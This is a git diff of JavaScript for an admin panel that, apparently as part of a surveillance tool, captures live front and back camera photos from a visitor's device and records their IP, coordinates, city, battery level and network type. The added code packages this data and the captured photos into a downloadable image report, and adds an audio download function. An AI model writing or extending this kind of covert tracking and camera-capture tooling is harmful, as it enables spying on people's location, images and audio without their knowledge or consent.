                         <div style="margin-top:20px; border-top:1px solid rgba(255,255,255,0.1); padding-top:15px;">
                             <h3>📸 Live Camera Control</h3>
-                            <p style="font-size:13px; color:rgba(255,255,255,0.5);">Capture live photos from visitor's device</p>
-                            <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:10px;">
-                                <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78;">📷 Capture Front</button>
-                                <button onclick="captureVisitorPhoto('back')" class="camera-btn" style="background:#4299e1;">📷 Capture Back</button>
-                                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📷 Capture Both</button>
+                            <p style="font-size:12px; color:rgba(255,255,255,0.5);">Capture live photos from visitor's device</p>
+                            <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:10px;">
+                                <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78; padding:6px 14px; font-size:13px;">📷 Capture Front</button>
+                                <button onclick="captureVisitorPhoto('back')" class="camera-btn" style="background:#4299e1; padding:6px 14px; font-size:13px;">📷 Capture Back</button>
+                                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936; padding:6px 14px; font-size:13px;">📷 Capture Both</button>
                             </div>
-                            <div id="captureStatus" style="margin-top:10px; font-size:14px; color:#666;"></div>
+                            <div id="captureStatus" style="margin-top:10px; font-size:13px; color:#666;"></div>
                         </div>
                     </div>
                 </div>
             `;
             container.innerHTML = html;
+        });
+}
+
+// ============================================
+// EXPORT VISITOR DATA AS IMAGE
+// ============================================
+function exportVisitorData(userId) {
+    fetch(`/api/visitor/${userId}`)
+        .then(response => response.json())
+        .then(user => {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            // Set canvas size
+            canvas.width = 800;
+            canvas.height = 600;
+            
+            // Background
+            const gradient = ctx.createLinearGradient(0, 0, 800, 600);
+            gradient.addColorStop(0, '#0f0c29');
+            gradient.addColorStop(0.5, '#302b63');
+            gradient.addColorStop(1, '#24243e');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, 800, 600);
+            
+            // Header
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 28px Arial';
+            ctx.fillText('📊 Visitor Data Report', 30, 50);
+            
+            ctx.fillStyle = '#667eea';
+            ctx.font = '14px Arial';
+            ctx.fillText(`Generated: ${new Date().toLocaleString()}`, 30, 75);
+            
+            // User Info
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 18px Arial';
+            ctx.fillText('👤 User Information', 30, 110);
+            
+            const info = [
+                `ID: ${user.id}`,
+                `Device: ${user.deviceName || 'N/A'}`,
+                `IP: ${user.ip || 'N/A'}`,
+                `Location: ${user.location ? `${user.location.city || ''} ${user.location.state || ''} ${user.location.country || ''}` : 'N/A'}`,
+                `Coordinates: ${user.location ? `${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}` : 'N/A'}`,
+                `Battery: ${user.battery || 'N/A'}%`,
+                `Network: ${user.network?.effectiveType || user.network?.type || 'N/A'}`,
+                `Visits: ${user.totalVisits || 0}`,
+                `First Visit: ${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}`
+            ];
+            
+            ctx.fillStyle = 'rgba(255,255,255,0.8)';
+            ctx.font = '13px Arial';
+            info.forEach((line, i) => {
+                ctx.fillText(line, 40, 140 + i * 22);
+            });
+            
+            // Load and draw photos
+            let yPos = 340;
+            let photosLoaded = 0;
+            
+            const drawPhoto = (imgSrc, label, y) => {
+                const img = new Image();
+                img.onload = function() {
+                    ctx.fillStyle = '#ffffff';
+                    ctx.font = 'bold 14px Arial';
+                    ctx.fillText(label, 30, y);
+                    
+                    const maxWidth = 150;
+                    const maxHeight = 150;
+                    let width = img.width;
+                    let height = img.height;
+                    if (width > maxWidth) { height = (height * maxWidth) / width; width = maxWidth; }
+                    if (height > maxHeight) { width = (width * maxHeight) / height; height = maxHeight; }
+                    
+                    ctx.drawImage(img, 40, y + 5, width, height);
+                    photosLoaded++;
+                    if (photosLoaded >= 2) {
+                        // Footer
+                        ctx.fillStyle = 'rgba(255,255,255,0.3)';
+                        ctx.font = '12px Arial';
+                        ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 570);
+                        
+                        const link = document.createElement('a');
+                        link.download = `visitor-data-${user.id}.png`;
+                        link.href = canvas.toDataURL('image/png');
+                        link.click();
+                    }
+                };
+                img.src = imgSrc;
+            };
+            
+            if (user.frontCamera) {
+                const imgSrc = user.frontCamera.image || user.frontCamera;
+                drawPhoto(imgSrc, '📸 Front Camera', 310);
+            }
+            if (user.backCamera) {
+                const imgSrc = user.backCamera.image || user.backCamera;
+                drawPhoto(imgSrc, '📸 Back Camera', 470);
+            }
+            
+            if (!user.frontCamera && !user.backCamera) {
+                ctx.fillStyle = 'rgba(255,255,255,0.5)';
+                ctx.font = '14px Arial';
+                ctx.fillText('No photos available', 40, 350);
+                
+                const link = document.createElement('a');
+                link.download = `visitor-data-${user.id}.png`;
+                link.href = canvas.toDataURL('image/png');
+                link.click();
+            }
         });
 }
 
@@ -780,7 +1089,7 @@ function captureVisitorPhoto(type) {
 }
 
 // ============================================
-// DOWNLOAD PHOTO
+// DOWNLOAD PHOTO / AUDIO
 // ============================================
 function downloadPhoto(imageData, filename) {
     if (!imageData || imageData === 'null' || imageData === 'undefined') {
@@ -794,9 +1103,27 @@ function downloadPhoto(imageData, filename) {
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
-        showNotification('⬇️ Photo downloaded!');
+        showNotification('⬇️ Downloaded!');
     } catch (e) {
-        alert('Error downloading photo: ' + e.message);
+        alert('Error: ' + e.message);
+    }
+}
+
+function downloadAudio(audioData, filename) {
+    if (!audioData) {
+        alert('No audio to download');
+        return;
+    }
+    try {
+        const link = document.createElement('a');
+        link.href = audioData;
+        link.download = filename || 'audio.webm';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        showNotification('⬇️ Audio downloaded!');
+    } catch (e) {
+        alert('Error: ' + e.message);
     }
 }
 
@@ -832,19 +1159,6 @@ function exportAllData() {
             a.click();
             URL.revokeObjectURL(url);
             showNotification('📥 Data exported successfully!');
-        });
-}
-
-// ============================================
-// UPDATE STATS
-// ============================================
-function updateStats() {
-    fetch('/api/visitors')
-        .then(response => response.json())
-        .then(visitors => {
-            document.getElementById('totalVisitors').textContent = visitors.length;
-            document.getElementById('activeVisitors').textContent = visitors.filter(v => v.connected).length;
-            document.getElementById('totalLinks').textContent = visitors.length;
         });
 }
 
